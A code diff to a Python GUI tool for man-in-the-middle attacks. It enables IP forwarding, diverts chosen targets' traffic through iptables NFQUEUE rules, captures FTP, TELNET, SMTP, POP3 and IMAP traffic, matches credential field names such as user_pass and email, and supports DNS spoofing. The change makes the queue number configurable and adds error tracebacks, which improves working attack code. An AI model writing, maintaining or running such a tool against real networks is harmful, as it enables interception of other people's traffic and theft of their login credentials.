@@ -16,6 +16,7 @@ from PySide6.QtGui import QIcon
 from PySide6.QtCore import Qt, QThread, Signal
 import socket
 import time
+import traceback  # Added for better error output
 
 user_fields = [
     "phone", "user_pass", "uname", "user_login", "user_name", "email",
@@ -226,7 +227,7 @@ class DNSPacketInterceptor:
 class PacketCaptureThread(QThread):
     log = Signal(str)
     finished = Signal()
-    def __init__(self, targets, iface, dns_spoof_domains=None, dns_spoof_ip=None):
+    def __init__(self, targets, iface, dns_spoof_domains=None, dns_spoof_ip=None, queue_num=1):
         super().__init__()
         self.targets = targets
         self.iface = iface
@@ -238,6 +239,7 @@ class PacketCaptureThread(QThread):
         self.capture_protocols = {
             21: 'FTP', 23: 'TELNET', 25: 'SMTP', 110: 'POP3', 143: 'IMAP'
         }
+        self.queue_num = queue_num  # Make queue number configurable
 
     def process_packet(self, packet):
         try:
@@ -305,16 +307,22 @@ class PacketCaptureThread(QThread):
 
     def run(self):
         try:
+            os.system("modprobe nfnetlink_queue")  # Ensure kernel module is loaded
             enable_ip_forward()
             self._iptables_set = True
             for target in self.targets:
-                os.system(f"iptables -I FORWARD -i {self.iface} -s {target} -j NFQUEUE --queue-num 1")
-                os.system(f"iptables -I FORWARD -o {self.iface} -d {target} -j NFQUEUE --queue-num 1")
+                os.system(f"iptables -I FORWARD -i {self.iface} -s {target} -j NFQUEUE --queue-num {self.queue_num}")
+                os.system(f"iptables -I FORWARD -o {self.iface} -d {target} -j NFQUEUE --queue-num {self.queue_num}")
             self.log.emit("Packet capture started. MITM running.")
-            self.nfqueue.bind(1, self.process_packet)
+            try:
+                self.nfqueue.bind(self.queue_num, self.process_packet)
+            except Exception as queue_ex:
+                self.log.emit(f"Capture error: Failed to create queue {self.queue_num}. Is another program using it? Is the kernel module loaded?")
+                self.log.emit("Full traceback:\n" + traceback.format_exc())
+                return
             self.nfqueue.run()
         except Exception as ex:
-            self.log.emit(f"Capture error: {ex}")
+            self.log.emit(f"Capture error: {ex}\n{traceback.format_exc()}")
         finally:
             try:
                 self.nfqueue.unbind()
@@ -322,8 +330,8 @@ class PacketCaptureThread(QThread):
                 pass
             if self._iptables_set:
                 for target in self.targets:
-                    os.system(f"iptables -D FORWARD -i {self.iface} -s {target} -j NFQUEUE --queue-num 1")
-                    os.system(f"iptables -D FORWARD -o {self.iface} -d {target} -j NFQUEUE --queue-num 1")
+                    os.system(f"iptables -D FORWARD -i {self.iface} -s {target} -j NFQUEUE --queue-num {self.queue_num}")
+                    os.system(f"iptables -D FORWARD -o {self.iface} -d {target} -j NFQUEUE --queue-num {self.queue_num}")
             disable_ip_forward()
             self.finished.emit()
 
